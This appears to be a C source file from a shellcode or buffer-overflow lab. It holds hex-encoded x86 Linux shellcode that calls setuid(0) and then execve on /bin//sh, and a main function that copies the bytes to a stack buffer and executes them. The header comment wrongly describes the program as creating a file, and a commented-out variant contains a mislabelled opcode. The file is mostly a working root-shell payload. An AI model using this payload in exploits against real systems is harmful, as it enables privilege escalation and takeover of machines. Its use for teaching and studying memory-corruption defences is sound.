/* call_shellcode.c  */

/*A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char code[] =
  
"\x6a\x17"               /* push    $0x17                  */
"\x58"                   /* pop     %eax                   */
"\x31\xdb"               /* xor     %ebx,%ebx              */
"\xcd\x80"               /* int     $0x80                  */

  // "\x89\xe3"             /* movl    %esp,%ebx              */
  // "\x50"                 /* pushl   %eax                   */
  // "\x53"                 /* pushl   %ebx                   */
  // "\x89\xe1"             /* movl    %esp,%ecx              */
  // "\x99"                 /* cdq                            */
  // "\x50"                 /* pushl   %eax                   */
  // "\x17\x0b"             /* movb    $0x17,%al              */
  // "\xcd\x80"             /* int     $0x80                  */

  "\x31\xc0"             /* xorl    %eax,%eax              */
  "\x50"                 /* pushl   %eax                   */
  "\x68""//sh"           /* pushl   $0x68732f2f            */
  "\x68""/bin"           /* pushl   $0x6e69622f            */
  "\x89\xe3"             /* movl    %esp,%ebx              */
  "\x50"                 /* pushl   %eax                   */
  "\x53"                 /* pushl   %ebx                   */
  "\x89\xe1"             /* movl    %esp,%ecx              */
  "\x99"                 /* cdq                            */
  "\xb0\x0b"             /* movb    $0x0b,%al              */
  "\xcd\x80"             /* int     $0x80                  */
;

int main(int argc, char **argv)
{
   char buf[sizeof(code)];
   strcpy(buf, code);
   ((void(*)( ))buf)( );
}
